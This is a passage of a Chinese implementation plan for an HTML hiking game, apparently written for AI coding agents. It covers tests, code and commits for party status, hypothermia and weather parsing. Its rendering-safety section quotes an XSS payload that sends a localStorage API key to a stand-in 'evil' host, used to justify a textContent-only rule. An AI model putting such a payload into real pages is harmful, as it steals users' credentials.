# 穿越鳌太线 · 计划二：引擎补完与准备阶段界面

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 补完计划一遗留的三处引擎缺口，搭起应用外壳与存档，做出捏人、抽卡、商店三个原生界面——完成后双击 `dist/穿越鳌太线.html` 就能捏一个人、抽两个队友、买一趟装备并存档。

**Architecture:** 纯 DOM，无框架，无依赖。每个界面拆成**纯视图模型**（`xxxViewModel(...)`，无副作用、可被 `node --test` 直接测）与**薄渲染层**（`renderXxx(vm, root)`，只做 DOM 写入，靠肉眼与手动验证）。屏幕之间由一个极简路由切换。所有动态文本一律经 `setText` / `esc` 落地，全项目禁止把动态数据拼进 `innerHTML`。

**Tech Stack:** 原生 ES 模块 + `node --test` + `build.mjs` 拼接为单文件。无 npm 依赖。

---

## 为什么渲染安全在这个项目里是硬约束

上屏的动态内容有两个来源：玩家自填的名字/外貌，以及 **LLM 写的正文**。产物是单文件 HTML，玩家的 API key 就存在同源的 `localStorage` 里。

如果正文走 `innerHTML`，一段 `<img src=x onerror="fetch('//evil/'+localStorage.aotai_config)">` 就能把 key 送走。模型可能被提示注入，也可能只是复读了网页上抄来的脏数据——**不需要模型有恶意，只需要它不小心**。

所以本计划定下一条不可协商的规矩：

> **动态数据只能经 `setText()`（内部用 `textContent`）落地。任何把变量拼进 `innerHTML` 的写法都是缺陷，评审见到即打回。** 静态骨架用 `innerHTML` 无妨，但一旦有 `${}` 插值就必须换 `setText`。

Task 5 会把这条约束固化成一条测试。

---

## 代码风格约束（延续计划一，务必遵守）

`build.mjs` 靠行首正则剥离模块语法并把所有模块拼进同一个作用域，因此 `src/` 下所有文件必须：

1. **只用具名导出**，禁止 `export default`、禁止 `export { a, b }` 集中导出
2. **导入必须单行**，行尾不得有注释
3. 行首的 `import` / `export` 前不得有缩进
4. **模块顶层不得有同名标识符**（含私有常量）。命名带模块前缀：`SHOP_`、`SETUP_`、`SAVE_` 等
5. 新增 `src/*.js` 必须登记进 `build.mjs` 的 `MODULE_ORDER`，否则 `assertModuleOrderComplete()` 会让测试失败并点名路径

违反第 1、4 条不会静默——`test/build.test.js` 的「bundle 可求值」用例会撞出 `Identifier 'X' has already been declared`。但**命名冲突要在写的时候避免，别指望测试兜底**。

---

## 文件结构

| 文件 | 职责 |
|---|---|
| `src/engine/party.js` | **新增。** 队友在队状态与人物状态的唯一改动入口，同时写 `state` 与 `journal`，杜绝两处不同步 |
| `src/llm/validate.js` | 修改。新增 `离队` 提议字段——否则 `party.js` 是死代码 |
| `src/llm/prompt.js` | 修改。协议说明与范例里加上 `离队` |
| `src/engine/consume.js` | 修改。`sleep()` 接入失温判定，维护 `flags.失温连败` |
| `src/llm/validate.js` | 修改。`天气建议` 解析出 `{状态, 等级}`，让 `weather.等级` 不再是孤儿 |
| `src/data/gear.js` | 修改。补一款极寒睡袋，让冬季那条消不掉的警告能被消除 |
| `src/data/seasons.js` | 修改。`gearWarnings` 取最暖睡袋而非写死单一 id |
| `src/ui/dom.js` | **新增。** `el` / `setText` / `esc` / `clear` / `on` 五个工具，安全基线 |
| `src/ui/router.js` | **新增。** 屏幕注册与切换 |
| `src/ui/save.js` | **新增。** localStorage 存档槽、导出/导入、版本迁移 |
| `src/ui/config.js` | **新增。** API 配置的视图模型与界面 |
| `src/ui/portrait.js` | **新增。** 程序化立绘占位生成 + `assets/portraits/` 探测 |
| `src/ui/screen-create.js` | **新增。** 捏人 |
| `src/ui/screen-draw.js` | **新增。** 抽卡 |
| `src/ui/screen-shop.js` | **新增。** 商店 |
| `src/ui/app.js` | **新增。** 应用入口，串联准备流程 |
| `src/styles.css` | **新增。** 主题变量与全部样式 |
| `build.mjs` | 修改。`__STYLES__` 注入 `src/styles.css` |
| `src/index.html` | 修改。补上根容器结构 |

---

## 阶段一 · 引擎补完

### Task 1: 队友在队状态的唯一入口

计划一评审发现：`state.party[].在队` 初始化为 `true` 后永不改变，`state.party[].状态` 永远是 `'正常'`；而 `journal.人物状态` 是另一套、由 `updateNpcStatus` 维护。两套数据、两个调用点、没有任何地方写明要同时更新。

结果就是：LLM 叙述「王大鹏膝伤下撤了」之后，好感门槛仍会为这个已经离队的人放行，玩家会看到对着空气搭话的选项。

本任务建立**唯一改动入口**，从源头消灭不同步。

**Files:**
- Create: `src/engine/party.js`
- Modify: `build.mjs`
- Test: `test/party.test.js`

- [ ] **Step 1: 写失败的测试**

`test/party.test.js`：

```js
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { setNpcStatus, npcLeaves, activeParty, isActive } from '../src/engine/party.js'
import { createInitialState } from '../src/engine/state.js'
import { createJournal, renderJournal } from '../src/engine/journal.js'

function 局面() {
  const s = createInitialState({
    种子: 1, 季节: '秋季',
    pc: { 名字: '周野', 职业: '工程师', 年龄: 28, 性别: '男', 性格: 'renside',
          外貌: '偏瘦', 技能: [], 户外经验: 38 },
    队友: [{ npcId: 'chenyan', 好感: 45 }, { npcId: 'wangdapeng', 好感: 30 }],
    背包: [], 金钱: 5000,
  })
  return { s, j: createJournal() }
}

test('setNpcStatus 同时写 state 与 journal', () => {
  const { s, j } = 局面()
  setNpcStatus(s, j, 'chenyan', '轻度高反')
  assert.equal(s.party.find((p) => p.npcId === 'chenyan').状态, '轻度高反')
  assert.ok(renderJournal(j).includes('轻度高反'), '档案里也要有')
})

test('npcLeaves 置为不在队并同步状态', () => {
  const { s, j } = 局面()
  npcLeaves(s, j, 'wangdapeng', '膝伤下撤')
  const 王 = s.party.find((p) => p.npcId === 'wangdapeng')
  assert.equal(王.在队, false)
  assert.equal(王.状态, '膝伤下撤')
  assert.ok(renderJournal(j).includes('膝伤下撤'))
})

test('activeParty 只返回在队的人', () => {
  const { s, j } = 局面()
  assert.equal(activeParty(s).length, 2)
  npcLeaves(s, j, 'wangdapeng', '下撤')
  assert.deepEqual(activeParty(s).map((p) => p.npcId), ['chenyan'])
})

test('isActive 对离队者与查无此人都返回 false', () => {
  const { s, j } = 局面()
  assert.equal(isActive(s, 'chenyan'), true)
  npcLeaves(s, j, 'chenyan', '走散')
  assert.equal(isActive(s, 'chenyan'), false)
  assert.equal(isActive(s, '查无此人'), false)
})

test('对不存在的 npc 是安全的空操作', () => {
  const { s, j } = 局面()
  assert.equal(setNpcStatus(s, j, '查无此人', 'x'), false)
  assert.equal(npcLeaves(s, j, '查无此人', 'x'), false)
})

test('已经离队的人不会被重复处理', () => {
  const { s, j } = 局面()
  assert.equal(npcLeaves(s, j, 'chenyan', '第一次'), true)
  assert.equal(npcLeaves(s, j, 'chenyan', '第二次'), false)
  assert.equal(s.party.find((p) => p.npcId === 'chenyan').状态, '第一次')
})
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/party.test.js`
Expected: FAIL — `Cannot find module '.../src/engine/party.js'`

- [ ] **Step 3: 写实现**

`src/engine/party.js`：

```js
import { updateNpcStatus } from './journal.js'

// 队友状态的唯一改动入口。
//
// 为什么要有这个模块：人物状态在两处各存一份——state.party[].状态 进每回合的
// 状态快照，journal.人物状态 进旅程档案。计划一里没有任何地方写明要同时更新，
// 于是 state 那份永远停在「正常」。改一处漏一处的隐患，靠约定是防不住的，
// 只能靠「只留一个入口」。
export function setNpcStatus(state, journal, npcId, 状态) {
  const 同伴 = state.party.find((p) => p.npcId === npcId)
  if (!同伴) return false
  同伴.状态 = 状态
  updateNpcStatus(journal, npcId, 状态)
  return true
}

// 离队。好感门槛判定只认在队的人，所以这一步必须真的落到 state 上，
// 否则玩家会看到对着已经下撤的人搭话的选项。
export function npcLeaves(state, journal, npcId, 原因) {
  const 同伴 = state.party.find((p) => p.npcId === npcId)
  if (!同伴 || !同伴.在队) return false
  同伴.在队 = false
  同伴.状态 = 原因
  updateNpcStatus(journal, npcId, 原因)
  return true
}

export function activeParty(state) {
  return state.party.filter((p) => p.在队)
}

export function isActive(state, npcId) {
  return state.party.some((p) => p.npcId === npcId && p.在队)
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/party.test.js`
Expected: PASS，6 个测试全绿

- [ ] **Step 5: 登记进构建顺序**

`build.mjs` 的 `MODULE_ORDER` 在 `'src/engine/journal.js',` 之后加入 `'src/engine/party.js',`（它依赖 journal）。

- [ ] **Step 6: 跑全量测试并提交**

Run: `npm test`
Expected: 全绿

```bash
git add src/engine/party.js test/party.test.js build.mjs
git commit -m "feat: 队友在队状态的唯一改动入口

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 1B: 让模型有办法说「这个人走了」

Task 1 建好了 `party.js`，但**没有任何路径能调到它**——实测确认：

- `validateProposal` 返回 `{好感变更, 记忆, 伏笔, 选项, 去向, warnings}`，**没有离队字段**
- `src/llm/prompt.js` 里「离队」「下撤」「退出」一个字都没有

也就是说模型可以在正文里写「王大鹏膝伤严重，从水窝子下撤了」，而引擎永远不会知道。下一回合玩家照样能对着他搭话，好感门槛照样为他放行。

这正是计划一里 `失温连败` 的翻版：写了个模块，没有触发它的路。**不补这一步，Task 1 就是死代码。**

**Files:**
- Modify: `src/llm/validate.js`
- Modify: `src/llm/prompt.js`
- Modify: `src/turn.js`
- Test: `test/validate.test.js`、`test/turn.test.js`（追加）

- [ ] **Step 1: 追加失败的测试**

`test/validate.test.js` 追加：

```js
test('离队提议按名字解析，写进 离队', () => {
  const s = 局面()
  const r = validateProposal(s, { 离队: [{ npc: '王大鹏', 因: '膝伤严重，从水窝子下撤' }] })
  assert.equal(r.离队.length, 1)
  assert.equal(r.离队[0].npcId, 'wangdapeng')
  assert.ok(r.离队[0].因.includes('膝伤'))
})

test('认不出的人不当离队处理，记 warning', () => {
  const s = 局面()
  const r = validateProposal(s, { 离队: [{ npc: '张三丰', 因: 'x' }] })
  assert.deepEqual(r.离队, [])
  assert.ok(r.warnings.some((w) => w.includes('张三丰')))
})

test('本就不在队伍里的人不能被离队', () => {
  const s = 局面()
  const r = validateProposal(s, { 离队: [{ npc: '踏雪', 因: 'x' }] })
  assert.deepEqual(r.离队, [])
  assert.ok(r.warnings.length > 0)
})

test('已经离队的人不会被重复处理', () => {
  const s = 局面()
  s.party.find((p) => p.npcId === 'chenyan').在队 = false
  const r = validateProposal(s, { 离队: [{ npc: '陈岩', 因: '又走一次' }] })
  assert.deepEqual(r.离队, [])
})

test('离队原因过长会被截断', () => {
  const s = 局面()
  const r = validateProposal(s, { 离队: [{ npc: '陈岩', 因: '啊'.repeat(200) }] })
  assert.ok(r.离队[0].因.length <= 30, `没截断：${r.离队[0].因.length}`)
})

test('没有离队字段时 离队 是空数组而不是 undefined', () => {
  assert.deepEqual(validateProposal(局面(), {}).离队, [])
})
```

`test/turn.test.js` 追加：

```js
test('模型报了离队，引擎真的让人离队', async () => {
  const s = 局面()
  const j = createJournal()
  const r = await runTurn({
    state: s, journal: j,
    选中项: { id: 'A', 文本: '走', 类型: '徒步', require: {}, cost: {} },
    config: { apiKey: 'k', baseURL: 'https://x/v1', model: 'm' },
    streamImpl: async () => ({
      text: '[剧情]\n甲\n\n[下回选项]\nA. 乙\n\n<<<STATE>>>\n{"离队":[{"npc":"陈岩","因":"膝伤下撤"}]}',
    }),
  })
  assert.equal(r.ok, true)
  const 陈 = s.party.find((p) => p.npcId === 'chenyan')
  assert.equal(陈.在队, false, '模型说他走了，引擎却没让他走')
  assert.equal(陈.状态, '膝伤下撤')
})

test('离队后好感门槛不再为他放行', async () => {
  const s = 局面()
  // 陈岩初始好感 45，门槛 40 本该达标
  const { gap: 离队前 } = gapFor({ 好感: { chenyan: 40 } }, s)
  assert.equal(离队前, 0)

  await runTurn({
    state: s, journal: createJournal(),
    选中项: { id: 'A', 文本: '走', 类型: '徒步', require: {}, cost: {} },
    config: { apiKey: 'k', baseURL: 'https://x/v1', model: 'm' },
    streamImpl: async () => ({
      text: '[剧情]\n甲\n\n[下回选项]\nA. 乙\n\n<<<STATE>>>\n{"离队":[{"npc":"陈岩","因":"下撤"}]}',
    }),
  })
  const { gap: 离队后 } = gapFor({ 好感: { chenyan: 40 } }, s)
  assert.equal(离队后, UNREACHABLE, '人都走了，门槛还放行')
})
```

`test/turn.test.js` 顶部导入补上：

```js
import { gapFor, UNREACHABLE } from '../src/engine/threshold.js'
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/validate.test.js test/turn.test.js`
Expected: FAIL — `r.离队` 是 undefined

- [ ] **Step 3: 改 validate.js**

`validateProposal` 的 `out` 初始化补上 `离队: []`：

```js
  const out = { 好感变更: [], 离队: [], 记忆: [], 伏笔: { 新增: [], 已收: [] }, 选项: [], 去向: null, warnings: [] }
```

在好感那个循环之后插入：

```js
  // 离队。没有这一段，模型只能在正文里叙述某人下撤，引擎永远不知道——
  // 下一回合玩家照样能对着他搭话，好感门槛照样为他放行。
  for (const item of Array.isArray(proposal.离队) ? proposal.离队 : []) {
    if (!item || typeof item !== 'object') continue
    const npcId = resolveNpc(item.npc)
    if (!npcId) {
      out.warnings.push(`离队提议里认不出这个人：${item.npc}`)
      continue
    }
    const 同伴 = 队伍.find((p) => p.npcId === npcId)
    if (!同伴) {
      out.warnings.push(`${item.npc} 本就不在队伍里，忽略离队提议`)
      continue
    }
    if (!同伴.在队) {
      out.warnings.push(`${item.npc} 已经离队，忽略重复提议`)
      continue
    }
    out.离队.push({ npcId, 因: String(item.因 || '离队').slice(0, 30) })
  }
```

- [ ] **Step 4: 在 turn.js 里应用**

导入行补上：

```js
import { npcLeaves } from './engine/party.js'
```

在应用好感变更的循环之后插入：

```js
      for (const 离 of v.离队) {
        npcLeaves(state, journal, 离.npcId, 离.因)
      }
```

- [ ] **Step 5: 教模型这个字段存在**

`src/llm/prompt.js` 的协议说明里，`好感` 字段之后补一条。**照该文件已有的行文风格写**，要点：

- 字段名 `离队`，形如 `"离队":[{"npc":"王大鹏","因":"膝伤严重，从水窝子下撤"}]`
- **只在剧情真的写了某人离开时才报**，不要因为对方沉默或走得慢就报
- 离队不可逆，报错了收不回来
- 「因」控制在 30 字以内

并在 STATE 范例里加上这个字段，让模型有样可循。

- [ ] **Step 6: 跑测试确认通过**

Run: `npm test`
Expected: 全绿

- [ ] **Step 7: 验证回路真的闭上了**

Run:

```bash
node --input-type=module -e "
import { validateProposal } from './src/llm/validate.js'
import { buildSystemPrompt } from './src/llm/prompt.js'
console.log('validateProposal 返回字段:', Object.keys(validateProposal({party:[]}, {})).join(', '))
console.log('system prompt 提到离队:', buildSystemPrompt().includes('离队'))
"
```

Expected：字段列表里有 `离队`，且 system prompt 里提到了它。**两者缺一，回路就没闭上。**

- [ ] **Step 8: 提交**

```bash
git add src/llm/validate.js src/llm/prompt.js src/turn.js test/validate.test.js test/turn.test.js
git commit -m "feat: 让模型有办法报告队友离队

Task 1 建好了 party.js，却没有任何路径能调到它：validateProposal
没有离队字段，system prompt 里也一个字没提。模型可以在正文里写
「王大鹏从水窝子下撤了」，引擎永远不知道——下一回合玩家照样能
对着他搭话，好感门槛照样为他放行。

和计划一里 失温连败 是同一种毛病：写了模块，没有触发它的路。

现在补上 离队 字段：校验层解析人名、拒绝重复与不存在者，
编排层调 npcLeaves，system prompt 教模型何时该报。

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 2: 失温判定，让那条结局活过来

计划一评审发现：`ending.js` 会读 `flags.失温连败 >= 3` 判「失败遇险」，但**没有任何模块写过这个字段**。测试是手工把它设成 3 来验条件分支的，通往那里的路并不存在。

同时 `bag_liner` 的 `温标加成: 5` 只被采购警告用到，`sleep()` 根本不读——玩家照着警告买了内胆，睡眠一点没变。本任务一并解决。

**判定规则：** 有效温标 = `睡袋.温标 − 内胆温标加成`（没带睡袋记为 `+99`，即毫无保暖）。若 `季节.夜间温度 < 有效温标`，本次过夜判为失温，`失温连败 += 1`；否则归零。

**只加计数器，不动任何已有的体力数值**——计划一的睡眠回复 `+25 / +12` 是被测试钉死的，改动会波及既有断言。失温的后果由结局判定承担，不在这里加二次惩罚。

**Files:**
- Modify: `src/engine/consume.js`
- Test: `test/consume.test.js`（追加）

- [ ] **Step 1: 追加失败的测试**

在 `test/consume.test.js` 末尾追加：

```js
test('冬季没带睡袋过夜判为失温，连败计数递增', () => {
  const s = 状态({ 海拔: 3100 })
  s.meta.季节 = '冬季'
  s.place.nodeId = 'shuiwozi'
  sleep(s, { 恶劣天气: false })
  assert.equal(s.flags.失温连败, 1)
  sleep(s, { 恶劣天气: false })
  assert.equal(s.flags.失温连败, 2)
})

test('睡袋够暖则连败归零', () => {
  const s = 状态({ 海拔: 3100 })
  s.meta.季节 = '秋季'
  s.place.nodeId = 'shuiwozi'
  s.flags.失温连败 = 2
  s.pack.push({ gearId: 'tent', 档: '主流', 数量: 1, 单重: 2.4, 余量: 100 })
  s.pack.push({ gearId: 'sleeping_bag', 档: '主流', 数量: 1, 单重: 1.2, 余量: 100 })
  sleep(s, { 恶劣天气: false })
  // 秋季夜间 -6℃，睡袋温标 -10℃ 够用
  assert.equal(s.flags.失温连败, 0)
})

test('内胆真的顶用：冬季 -25℃ 下把有效温标从 -10 拉到 -15', () => {
  const 造 = (带内胆) => {
    const s = 状态({ 海拔: 3100 })
    s.meta.季节 = '冬季'
    s.place.nodeId = 'shuiwozi'
    s.pack.push({ gearId: 'sleeping_bag', 档: '主流', 数量: 1, 单重: 1.2, 余量: 100 })
    if (带内胆) s.pack.push({ gearId: 'bag_liner', 档: '通用', 数量: 1, 单重: 0.3, 余量: 100 })
    return s
  }
  // 冬季 -25℃ 下两者都不够，但有效温标必须随内胆变化
  assert.equal(effectiveWarmth(造(false)), -10)
  assert.equal(effectiveWarmth(造(true)), -15)
})

test('春季 -8℃ 下内胆足以扭转失温判定', () => {
  const 造 = (带内胆) => {
    const s = 状态({ 海拔: 3100 })
    s.meta.季节 = '春季'
    s.place.nodeId = 'shuiwozi'
    // 只带睡袋时有效温标 -10，春季 -8 已经够用；这里用没带睡袋对照
    if (带内胆) {
      s.pack.push({ gearId: 'sleeping_bag', 档: '主流', 数量: 1, 单重: 1.2, 余量: 100 })
    }
    return s
  }
  sleep(造(false), {})
  const 有 = 造(true)
  sleep(有, {})
  assert.equal(有.flags.失温连败, 0, '带了睡袋的春季不该失温')
})

test('没带睡袋时有效温标记为毫无保暖', () => {
  const s = 状态({ 海拔: 3100 })
  assert.equal(effectiveWarmth(s), 99)
})
```

同时把该文件顶部的导入行改为：

```js
import {
  stepStaminaCost, applyStepCost, isAcclimatized, effectiveWarmth,
  rest, eatHot, eatCold, sleep, advanceSlot, dailyUpkeep,
} from '../src/engine/consume.js'
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/consume.test.js`
Expected: FAIL — `effectiveWarmth is not a function`

- [ ] **Step 3: 写实现**

`src/engine/consume.js` 顶部的导入行改为（新增两个）：

```js
import { getNode } from '../data/route.js'
import { getSeason } from '../data/seasons.js'
import { removeItem, hasItem } from './state.js'
import { getGear } from '../data/gear.js'
```

在 `const 需要适应晚数 = 1` 下方追加常量（**不要加 `失温连败上限`——`ending.js` 已有同名常量，拼接后会撞车**）：

```js
const 毫无保暖 = 99
```

在 `isAcclimatized` 之后插入：

```js
// 有效温标 = 睡袋温标 − 内胆加成。数字越低越保暖。
// 没带睡袋记 +99：不是「有点冷」，是根本没有保暖可言。
// 温标一律从 gear.js 读，不在这里硬编码——改了装备表，这里要跟着变。
export function effectiveWarmth(state) {
  if (!hasItem(state, 'sleeping_bag')) return 毫无保暖
  const 睡袋 = getGear('sleeping_bag')
  const 加成 = hasItem(state, 'bag_liner') ? (getGear('bag_liner')?.温标加成 ?? 0) : 0
  return 睡袋.温标 - 加成
}
```

把 `sleep` 整个替换为：

```js
export function sleep(state, { 恶劣天气 = false } = {}) {
  const node = getNode(state.place.nodeId)
  const 装备齐 = hasItem(state, 'tent') && hasItem(state, 'sleeping_bag')
  const 条件好 = 装备齐 && node && node.可扎营 && !恶劣天气
  调整体力(state, 条件好 ? 25 : 12)

  if (node && node.海拔 >= 适应海拔线) state.flags.高海拔过夜数 += 1

  // 失温判定：夜里比睡袋扛得住的还冷，就算一次失温。连续 失温连败上限 次
  // 触发「失败遇险」结局（见 ending.js）。这里只记账，不再叠加体力惩罚——
  // 睡眠回复的 25/12 是被测试钉死的设计值，二次惩罚会让手感失控。
  const 季节 = getSeason(state.meta.季节)
  if (季节 && 季节.夜间温度 < effectiveWarmth(state)) {
    state.flags.失温连败 += 1
  } else {
    state.flags.失温连败 = 0
  }

  return state
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/consume.test.js`
Expected: PASS。**既有的睡眠测试（`+25` / `+12` / 高海拔过夜数）必须一条不动地继续通过**——若有失败，说明你改到了体力数值，退回去只加计数器。

- [ ] **Step 5: 验证结局真的能走到**

Run:

```bash
node -e "
import('./src/engine/state.js').then(async ({createInitialState}) => {
  const { sleep } = await import('./src/engine/consume.js')
  const { checkEnding } = await import('./src/engine/ending.js')
  const s = createInitialState({
    种子:1, 季节:'冬季',
    pc:{名字:'甲',职业:'乙',年龄:30,性别:'男',性格:'renside',外貌:'丙',技能:[],户外经验:30},
    队友:[], 背包:[], 金钱:100,
  })
  s.place = { nodeId:'shuiwozi', 海拔:3100 }
  for (let i=1;i<=3;i++) { sleep(s,{}); console.log('第'+i+'夜 失温连败 =', s.flags.失温连败, '｜结局:', checkEnding(s)?.type ?? '无') }
})
"
```

Expected：第 1、2 夜结局为「无」，**第 3 夜出现「失败遇险」**。若三夜都是「无」，说明计数器没接上。

- [ ] **Step 6: 提交**

```bash
git add src/engine/consume.js test/consume.test.js
git commit -m "feat: 失温判定接上失温连败计数器，内胆真正生效

ending.js 一直在读 flags.失温连败，但计划一里没有任何模块写它——
那条「失败遇险」结局是死代码，测试靠手工把标志设成 3 才走得到。

现在 sleep() 比对季节夜间温度与有效温标（睡袋温标 − 内胆加成），
不够暖即计一次失温，连续三次触发结局。顺带让 bag_liner 的
温标加成真正起作用——此前它只影响采购警告，买了等于没买。

只加计数器，不动睡眠回复的 25/12——那是被钉死的设计值。

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 3: 让 weather.等级 不再是孤儿字段

计划一评审发现：`state.weather.等级` 初始化为 `1` 后没有任何写入方。LLM 的 `天气建议` 只改 `状态`（描述文字）。而 `sleep()` 的 `恶劣天气` 参数需要调用方自己判断，「什么算恶劣」从没被定义过。

留着一个不起作用的字段只会误导后来者。本任务从 LLM 提议的天气描述里解出等级，并让它成为 `恶劣天气` 的唯一判据。

**等级定义：** 1–10。关键词命中即取该档，多个命中取最高。`>= 6` 视为恶劣天气。

**Files:**
- Modify: `src/llm/validate.js`
- Test: `test/validate.test.js`（追加）

- [ ] **Step 1: 追加失败的测试**

在 `test/validate.test.js` 末尾追加：

```js
test('天气等级按关键词解析，多个命中取最高', () => {
  assert.equal(weatherLevel('晴'), 1)
  assert.equal(weatherLevel('多云转阴'), 2)
  assert.equal(weatherLevel('起雾了'), 4)
  assert.equal(weatherLevel('大风'), 6)
  assert.equal(weatherLevel('暴雨'), 7)
  assert.equal(weatherLevel('暴风雪'), 9)
  assert.equal(weatherLevel('白化天'), 10)
  // 多个关键词取最高
  assert.equal(weatherLevel('大风转暴风雪'), 9)
})

test('认不出的天气描述给中间值，不是 0 也不是 10', () => {
  const lv = weatherLevel('天色不明')
  assert.ok(lv >= 3 && lv <= 5, `认不出时应给中间值，实为 ${lv}`)
})

test('天气等级 >= 6 视为恶劣', () => {
  assert.equal(isHarshWeather({ 等级: 5 }), false)
  assert.equal(isHarshWeather({ 等级: 6 }), true)
  assert.equal(isHarshWeather({ 等级: 10 }), true)
  assert.equal(isHarshWeather(undefined), false)
})

test('空描述与非字符串不炸', () => {
  assert.equal(typeof weatherLevel(''), 'number')
  assert.equal(typeof weatherLevel(null), 'number')
  assert.equal(typeof weatherLevel(123), 'number')
})
```

把该文件顶部的导入行补上两个新导出：

```js
import { resolveNpc, clampCost, clampRequire, validateProposal, weatherLevel, isHarshWeather, CLAMP_TABLE } from '../src/llm/validate.js'
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/validate.test.js`
Expected: FAIL — `weatherLevel is not a function`

- [ ] **Step 3: 写实现**

在 `src/llm/validate.js` 末尾追加：

```js
// 天气等级 1–10。计划一里 weather.等级 初始化为 1 之后没有任何写入方，
// 是个孤儿字段；而 sleep() 的「恶劣天气」又要调用方凭空判断。
// 这里给出唯一定义：从 LLM 写的天气描述里按关键词解出等级，>= 6 即恶劣。
const WEATHER_LEVELS = [
  [10, ['白化天', '白毛风']],
  [9, ['暴风雪', '雪暴']],
  [8, ['雷暴', '冰雹']],
  [7, ['暴雨', '大雪', '狂风']],
  [6, ['大风', '强风', '降雪', '雨夹雪']],
  [5, ['小雨', '阵雨', '霜冻']],
  [4, ['雾', '阴沉', '低云']],
  // 注意 tier 3 用「阴天」而非「阴」：多云转阴 含「阴」，取最高会得 3，
  // 与「多云转阴 = 2」的断言直接矛盾。关键词要选不会被上层短语包含的写法。
  [3, ['阴天', '转阴天']],
  [2, ['多云', '微风']],
  [1, ['晴', '无风', '晴朗']],
]

const 认不出时的等级 = 4

export function weatherLevel(描述) {
  if (typeof 描述 !== 'string' || !描述) return 认不出时的等级
  let 最高 = 0
  for (const [级, 词表] of WEATHER_LEVELS) {
    if (级 <= 最高) continue
    if (词表.some((w) => 描述.includes(w))) 最高 = 级
  }
  return 最高 || 认不出时的等级
}

export function isHarshWeather(weather) {
  return !!weather && weather.等级 >= 6
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/validate.test.js`
Expected: PASS

- [ ] **Step 5: 在 turn.js 里接上**

`src/turn.js` 的导入行补上 `weatherLevel`：

```js
import { validateProposal, clampRequire, clampCost, weatherLevel } from './llm/validate.js'
```

把天气应用那两行替换为：

```js
    if (parsed.state.天气建议) {
      // 这是唯一不经 validateProposal 的 LLM 字段（纯展示、不参与任何判定），
      // 但仍要截断——模型偶尔会把整段天气描写塞进来。
      // 先按完整描述解析等级，再截断显示文本。反过来的话，模型写了长句时
      // 关键词会被切掉——「…傍晚可能暴风雪」截到 40 字只剩「多云」，
      // 9 级暴风雪静默降成 2 级，没有任何报错。
      const 全文 = String(parsed.state.天气建议)
      state.weather = { 状态: 全文.slice(0, 40), 等级: weatherLevel(全文) }
    }
```

- [ ] **Step 6: 追加一条串联测试**

在 `test/turn.test.js` 末尾追加：

```js
test('LLM 提的天气会解析出等级，不再是孤儿字段', async () => {
  const s = 局面()
  const r = await runTurn({
    state: s, journal: createJournal(),
    选中项: { id: 'A', 文本: '走', 类型: '徒步', require: {}, cost: {} },
    config: { apiKey: 'k', baseURL: 'https://x/v1', model: 'm' },
    streamImpl: async () => ({
      text: '[剧情]\n甲\n\n[下回选项]\nA. 乙\n\n<<<STATE>>>\n{"天气建议":"转北风，夜间可能暴风雪"}',
    }),
  })
  assert.equal(r.ok, true)
  assert.equal(s.weather.等级, 9, `暴风雪应为 9 级，实为 ${s.weather.等级}`)
})
```

- [ ] **Step 7: 跑全量测试并提交**

Run: `npm test`
Expected: 全绿

```bash
git add src/llm/validate.js src/turn.js test/validate.test.js test/turn.test.js
git commit -m "feat: 天气等级解析，weather.等级 不再是孤儿字段

计划一里 weather.等级 初始化为 1 后没有任何写入方，而 sleep() 的
恶劣天气参数又要调用方凭空判断——两头悬空。

现在从 LLM 写的天气描述按关键词解出 1-10 级，>= 6 即恶劣，
给「什么算恶劣天气」一个唯一定义。

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 3B: 补一款极寒睡袋，让冬季警告能被消除

计划一记下的待调项：**装备表里最暖的睡袋是 −10℃，加内胆也只到 −15℃，而冬季夜间 −25℃——玩家无论怎么买，冬季都会一直看到那条睡袋警告。**

计划一里没动它，是因为 `EXTRA_GEAR` 的 25 项 / 16.05kg / ¥7,630 被测试钉死、还流进了 spec 第 7 节。但计划二正好要做商店界面，那条警告会明晃晃摆在警告栏里——**一条点了「一键推荐」也消不掉的警告，正是训练玩家无视所有警告的元凶**。现在补最便宜。

根子在源文档自身：它的装备表只有一款 −10℃ 睡袋，四季表却给冬季推荐「极寒睡袋（−20℃以下）」，两张表本就对不上。

**波及面已验算，两条核心约束不受影响：**

| | 原 | 加后 |
|---|---|---|
| 扩充物资 | 25 项 / 16.05kg / ¥7,630 | 26 项 / 17.85kg / ¥10,030 |
| 全配合计 | 30.15kg / ¥22,005 | 31.95kg / ¥24,405 |
| 超 30kg | 是 | 是 |
| 超 ¥20,000 | 是 | 是 |
| 买得起比例 | 45% | 41% |

**Files:**
- Modify: `src/data/gear.js`
- Modify: `src/engine/consume.js`（`effectiveWarmth` 改为取最暖的睡袋）
- Modify: `src/data/seasons.js`（`gearWarnings` 同上）
- Modify: `docs/superpowers/specs/2026-08-11-aotai-html-game-design.md`（第 7 节数字与表格）
- Test: `test/gear.test.js`、`test/consume.test.js`、`test/seasons.test.js`（改钉死的数字并补断言）

- [ ] **Step 1: 改测试里被钉死的数字（先让它红）**

`test/gear.test.js`：

- 「原表 21 项，扩充 25 项」→ `EXTRA_GEAR.length` 改 `26`、`ALL_GEAR.length` 改 `47`
- 「扩充物资合计 16.05kg / ¥7,630」→ 改 `17.85` 与 `10030`

追加：

```js
test('极寒睡袋温标够冬季用', () => {
  const g = getGear('winter_bag')
  assert.ok(g, '缺少 winter_bag')
  assert.equal(g.温标, -25)
  // 冬季夜间 -25℃，温标 -25℃ 正好够（判定用严格小于）
  assert.ok(!(-25 < g.温标), '极寒睡袋仍扛不住冬季，那这项就白加了')
})

test('两款睡袋并存，价格与保暖成正比', () => {
